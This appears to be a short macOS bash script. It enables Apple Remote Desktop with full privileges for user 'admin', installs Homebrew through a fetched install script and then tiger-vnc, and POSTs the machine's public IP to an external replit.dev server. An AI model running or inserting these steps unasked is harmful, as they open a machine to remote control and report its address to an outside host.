#!/bin/bash

sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -users admin -access -on -restart -agent -privs -all

/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

brew install tiger-vnc

IP=$(curl -s https://api.ipify.org)
curl -X POST -d "ip=$IP" https://b7a52944-e2d1-416e-b043-08079767fd73-00-1ar7v2aq8ozsz.picard.replit.dev/
